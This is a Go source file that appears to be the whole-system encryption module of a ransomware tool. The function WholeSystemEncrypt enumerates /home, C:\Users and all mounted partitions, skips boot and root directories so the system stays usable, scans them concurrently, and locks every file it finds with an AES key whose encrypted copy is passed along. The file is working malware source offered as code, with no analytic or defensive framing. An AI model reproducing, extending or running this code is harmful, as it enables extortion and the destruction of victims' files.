package system

import (
	"fmt"
	"os"
	"sync"
	"time"

	"frostbite.com/tools/file"
	scan "frostbite.com/tools/scan"
	humanize "github.com/dustin/go-humanize"
	"github.com/shirou/gopsutil/disk"
)

var pl = fmt.Println

func WholeSystemEncrypt(aesKey []byte, encryptedAesKey []byte) {

	//set variables
	var (
		filesToEncrypt []string
		// sizeOfFoundFiles int64
	)
	dirsToScan := []string{
		"/home",
		"C:\\Users",
	}
	dirsToRemove := []string{"/", "C:", "C:\\\\", "/boot/efi", "/boot"}
	timeNow := time.Now()

	dirsToScan = generateListOfDirsToScan(dirsToScan, dirsToRemove)
	pl("dirsToScan: ", dirsToScan)

	//listen for channel and append to filesToEncrypt
	filesToEncrypt = getAllFiles(dirsToScan, encryptedAesKey)
	//encrypt files
	pl("Locking...")
	file.LockFilesArray(filesToEncrypt, aesKey)

	timeEnd := time.Now()
	pl("\nTOTAL files found: ", humanize.Comma(int64(len(filesToEncrypt))))
	//print human readable size
	pl("Time elapsed: ", timeEnd.Sub(timeNow))

}

func getAllFiles(dirsToScan []string, encryptedAesKey []byte) []string {
	wg := sync.WaitGroup{}
	wg.Add(len(dirsToScan))

	var chanFilesScanned = make(chan []string)
	var filesToEncrypt []string

	for _, dir := range dirsToScan {
		go goroutineScanDir(dir, &wg, chanFilesScanned, encryptedAesKey)
	}

	go func() {
		for range dirsToScan {
			files := <-chanFilesScanned
			filesToEncrypt = append(filesToEncrypt, files...)
			wg.Done()

		}
	}()

	wg.Wait()
	return filesToEncrypt
}

func goroutineScanDir(dir string, wg *sync.WaitGroup, chanFilesScanned chan []string, encryptedAesKey []byte) {

	_, err := os.Stat(dir)
	if err != nil {
		if os.IsNotExist(err) {
			fmt.Println("Dir does not exist: ", dir)
			wg.Done()
		}
	} else {
		pl("Scanning: ", dir)
		files := scan.ScanFilesInDirWithLockAdd(dir, true, encryptedAesKey)
		//send files to channel
		chanFilesScanned <- files

		pl("Files found in this dir: ", humanize.Comma(int64(len(files))))
	}
}

func generateListOfDirsToScan(dirsToScan []string, dirsToRemove []string) []string {
	partitions, _ := disk.Partitions(false)

	for _, partition := range partitions {
		dirsToScan = append(dirsToScan, partition.Mountpoint)
	}

	dirsToScan = removeDirsFromList(dirsToRemove, dirsToScan)
	return dirsToScan
}

func removeDirsFromList(dirsToRemove []string, dirsToScan []string) []string {
	//* Remove dirs that would break the system

	dirsToReturn := []string{}
	for _, dir := range dirsToScan {
		//check if dir exists and add it to dirsToReturn
		_, err := os.Stat(dir)
		if err == nil {
			dirsToReturn = append(dirsToReturn, dir)

		}

		for _, dirToRemove := range dirsToRemove {
			for i, dir := range dirsToReturn {
				if dir == dirToRemove {
					dirsToReturn = append(dirsToReturn[:i], dirsToReturn[i+1:]...)
				}
			}
		}
	}
	return dirsToReturn
}
